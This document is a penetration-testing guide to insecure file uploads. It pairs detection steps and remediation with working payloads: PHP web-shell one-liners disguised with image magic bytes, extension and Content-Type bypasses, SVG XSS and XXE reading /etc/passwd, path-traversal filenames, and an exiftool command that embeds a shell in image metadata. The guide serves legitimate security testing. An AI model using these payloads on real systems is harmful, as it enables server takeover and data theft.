# File Upload Vulnerability Testing

## Overview
Insecure file upload functionality allows attackers to upload malicious files that can lead to remote code execution, XSS, path traversal, or denial of service.

## Classification
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **OWASP:** A04:2021 - Insecure Design
- **CVSS Base:** 7.5 - 9.8

## Detection Methodology

### 1. Identify Upload Functionality
- Profile picture / avatar upload
- Document uploads
- File attachments
- Import functionality (CSV, XML)
- Theme/plugin uploads (CMS)

### 2. Analyze Upload Restrictions
- File extension check (client-side vs server-side)
- Content-Type header validation
- File content / magic bytes validation
- File size limits
- Filename sanitization

### 3. Extension Bypass Techniques

**Double extensions:** `shell.php.jpg`, `shell.php.png`

**Case variation:** `shell.pHp`, `shell.PHP`

**Alternative extensions:**
```
PHP: .php, .php3, .php4, .php5, .phtml, .phar, .phps, .pht
ASP: .asp, .aspx, .ashx, .config, .cshtml
JSP: .jsp, .jspx, .jsw, .jsv, .jspf
```

**Null byte:** `shell.php%00.jpg`

**Trailing chars:** `shell.php.`, `shell.php%20`, `shell.php%0a`

### 4. Content-Type Manipulation
```
Content-Type: image/jpeg      (while uploading PHP)
Content-Type: image/png
Content-Type: image/gif
```

### 5. Magic Bytes Bypass
```php
GIF89a<?php system($_GET['cmd']); ?>          // GIF header + PHP
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?> // JPEG header + PHP
```

### 6. SVG-Based Attacks

**XSS via SVG:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**XXE via SVG:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### 7. Path Traversal via Filename
```
../../../var/www/shell.php
..%2F..%2F..%2Fvar/www/shell.php
```

### 8. Zip-Based Attacks
**Zip Slip:** Create ZIP with path traversal entries
**Zip Bomb:** Small compressed file, huge decompressed size

## Tool Usage
```bash
# Exiftool — embed payload in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Nuclei file upload templates
nuclei -u http://target.com -t file-upload/ -batch
```

## Remediation
1. **Whitelist file extensions**
2. **Validate file content** — check magic bytes AND structure
3. **Rename uploaded files** — random UUID filenames
4. **Store outside webroot**
5. **Remove execute permission** on upload directory
6. **Use CDN/separate domain** for serving uploads
7. **Scan for malware**
8. **Content-Disposition: attachment**

## Evidence Collection
- Validations bypassed
- Payload file content
- Uploaded file URL
- Code execution proof
- Server environment details
